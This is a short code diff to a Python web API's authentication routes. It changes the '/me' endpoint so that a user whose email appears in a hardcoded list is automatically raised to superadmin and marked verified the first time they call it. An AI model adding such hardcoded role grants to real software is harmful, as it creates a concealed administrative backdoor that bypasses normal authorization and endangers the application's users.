@@ -72,7 +72,14 @@ async def login(req: LoginRequest, db: AsyncSession = Depends(get_db)):
     return {"token": token, "user": user_response(user)}
 
 @router.get("/me")
-async def get_me(user: User = Depends(get_current_user)):
+async def get_me(user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
+    # Auto-promote superuser on first access
+    SUPERUSER_EMAILS = ["udezedike@gmail.com"]
+    if user.email in SUPERUSER_EMAILS and user.role not in ("admin", "superadmin"):
+        user.role = "superadmin"
+        user.verified = True
+        await db.flush()
+        await db.refresh(user)
     return user_response(user)
 
 @router.patch("/profile")
